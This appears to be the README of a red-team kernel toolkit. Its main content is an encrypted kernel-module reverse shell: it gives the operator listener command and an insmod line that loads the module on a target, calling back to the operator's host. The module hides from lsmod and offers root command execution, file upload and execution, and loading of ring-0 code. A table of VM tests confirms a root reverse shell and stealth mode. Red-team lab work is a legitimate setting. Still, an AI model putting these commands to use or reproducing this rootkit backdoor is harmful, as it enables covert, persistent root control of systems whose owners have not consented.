# Kernel Toolkit

The `kernel/` directory contains kernel-mode tools for the red team lab. See `kernel/lab.md` for the full lab guide.

## Quick start

```bash
# Prerequisites
apt install qemu-system-x86 qemu-utils genisoimage

# Run all kernel tests in hermetic VMs (downloads Ubuntu cloud image on first run)
bazel test //kernel:ubuntu_suite

# Interactive VM shell for exploration
python3 kernel/vm/vm_harness.py shell --distro ubuntu
```

## Encrypted kernel shell

```bash
# Generate a key
KEY=$(python3 -c "import os; print(os.urandom(32).hex())")

# Start operator listening post
python3 kernel/lp/listener.py --port 4444 --key $KEY

# On target: load stealth encrypted shell (hidden from lsmod)
insmod kshell_nacl.ko host=<operator_ip> port=4444 key=$KEY
```

Shell commands:
- `<cmd>` -- run shell command as root
- `!upload <local_file> <remote_path>` -- upload file to target
- `!run <path>` -- execute uploaded binary
- `!kload <blob_file>` -- load PIC blob into ring 0 (runs in its own kthread)
- `exit` -- disconnect

## Crypto

All encryption uses embedded TweetNaCl (XSalsa20 + Poly1305). No dependency on the kernel crypto API -- works on kernels 2.6 through latest.

## VM tests

7 tests verified on Ubuntu 24.04 (kernel 6.8):

| Test | What it verifies |
|------|-----------------|
| `kmod_build` | Kernel module compiles |
| `kmod_nopanic` | Module loads without crashing |
| `kshell` | Plaintext reverse shell, uid=0 |
| `kshell_nacl` | NaCl-encrypted shell connects |
| `kshell_ff` | Stealth mode (hidden from lsmod) |
| `kshell_upload` | File upload + execution through shell |
| `examples_build` | All example modules compile |
